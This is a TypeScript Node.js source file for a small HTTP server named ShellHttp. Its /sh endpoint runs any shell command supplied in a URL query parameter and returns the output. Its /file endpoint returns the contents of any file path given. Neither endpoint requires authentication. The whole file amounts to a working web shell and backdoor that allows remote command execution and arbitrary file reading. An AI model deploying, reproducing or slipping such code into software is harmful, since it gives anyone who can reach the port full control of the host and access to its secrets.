import { argv, exit, platform, arch } from "node:process";
import { readFile } from "node:fs/promises";
import { exec } from "node:child_process";
import { promisify } from "node:util";
import { extname } from "node:path";
import { Server } from "node:http";

import type { IncomingMessage, ServerResponse } from "node:http";

type Controller = (req: IncomingMessage, res: ServerResponse<IncomingMessage> & { req: IncomingMessage }) => void;

const ShellHttp = class {
  constructor() {
    const server = new Server();
    const PORT = argv[2] !== undefined && !isNaN(+argv[2]) ? +argv[2] : 0;

    server.on("request", (req, res) => {
      try {
        this.#logger(req, res);
        if (req.method !== "GET") return res.writeHead(404).end();
        if (req.url?.includes("/status")) return res.writeHead(204).end();
        if (req.url?.includes("/info")) return this.#info(req, res);
        if (req.url?.includes("/sh")) return this.#shHandler(req, res);
        if (req.url?.includes("/file")) return this.#fileHandler(req, res);
        return res.writeHead(404).end();
      } catch (error) {
        res.writeHead(500, this.#getContentType("json")).write(JSON.stringify(error));
        return res.end();
      }
    });

    try {
      const { port: openPort } = server
        .listen(PORT, () => console.info(`Server: http://localhost:${openPort}`))
        .address() as { port: number };
    } catch (error) {
      console.trace(error);
      exit(1);
    }
  }

  readonly #logger: Controller = ({ method, url }, res) => {
    const start = Date.now();
    res.on("finish", () => {
      const time = Date.now() - start;
      console.log(`[${method}] '\x1B[34m${url}\x1B[0m' - ${res.statusCode} - ${time}ms`);
    });
  };

  readonly #info: Controller = (_, res) => {
    res.writeHead(200, this.#getContentType("plain"));
    res.write(`${platform} ${arch}`);
    return res.end();
  };

  readonly #shHandler: Controller = async (req, res) => {
    const query = this.#extractQueryParams(req.url as string) as unknown as { command: string };
    if (query.command === undefined) return res.writeHead(400).end();
    if (typeof query.command !== "string") return res.writeHead(400).end();
    try {
      const { stderr, stdout } = await promisify(exec)(query.command as string);
      if (stderr.length !== 0) throw new Error(stderr);
      res.writeHead(200, this.#getContentType("plain")).write(stdout);
      return res.end();
    } catch (error) {
      res.writeHead(400, this.#getContentType("json")).write(JSON.stringify(error));
      return res.end();
    }
  };

  readonly #fileHandler: Controller = async (req, res) => {
    const query = this.#extractQueryParams(req.url as string) as unknown as { name: string };
    if (query.name === undefined) return res.writeHead(400).end();
    if (typeof query.name !== "string") return res.writeHead(400).end();
    try {
      const contentType = this.#getContentType(extname(query.name));
      res.writeHead(200, contentType).write(await readFile(query.name));
      return res.end();
    } catch (error) {
      console.trace(error);
      res.writeHead(400).write(error);
      return res.end();
    }
  };

  readonly #extractQueryParams = (endpoint: string) => {
    const [_, queryString] = endpoint.split("?");
    if (queryString === undefined) return { query: {} };
    const url = new URL("https://example.com" + endpoint);
    const searchParams = new URLSearchParams(url.search);
    return Object.fromEntries(searchParams.entries());
  };

  readonly #getContentType = (type: string): { "Content-Type": string } | undefined => {
    let result: string | undefined;
    if (!type.includes(".")) result = this.#contentTypes[type];
    else result = this.#contentTypes[type.split(".").pop() as string];
    return result !== undefined ? { "Content-Type": result } : undefined;
  };

  readonly #contentTypes: Record<string, `${string}${string}`> = {
    pptx: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
    docx: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
    xlsx: "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
    zip: "application/zip",
    pdf: "application/pdf",
    json: "application/json",
    xml: "application/xml",
    plain: "text/plain",
    txt: "text/plain",
    html: "text/html",
    css: "text/css",
    png: "image/png",
    jpg: "image/jpg",
    jpeg: "image/jpeg",
    gif: "image/gif",
    svg: "image/svg+xml",
    webp: "image/webp",
    mp3: "audio/mp3",
    wav: "audio/wav",
    ogg: "audio/ogg",
    mp4: "video/mp4",
    mkv: "video/mkv",
    webm: "video/webm",
    avi: "video/x-msvideo",
  };
};

new ShellHttp();
